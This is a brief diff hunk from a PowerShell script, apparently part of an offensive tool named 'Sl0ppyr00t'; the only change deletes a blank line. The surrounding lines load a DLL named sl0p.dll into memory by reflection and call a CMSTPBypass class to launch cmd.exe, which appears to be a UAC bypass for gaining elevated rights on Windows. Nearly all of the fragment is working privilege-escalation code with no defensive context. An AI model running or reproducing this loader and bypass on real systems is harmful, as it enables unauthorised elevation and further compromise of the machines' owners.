@@ -68,7 +68,6 @@ switch ($OSVersion)
 	Write-Host ""
 	Write-Host ""
 	Write-Host " {Sl0ppyr00t} File Is there."
-	
 	[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
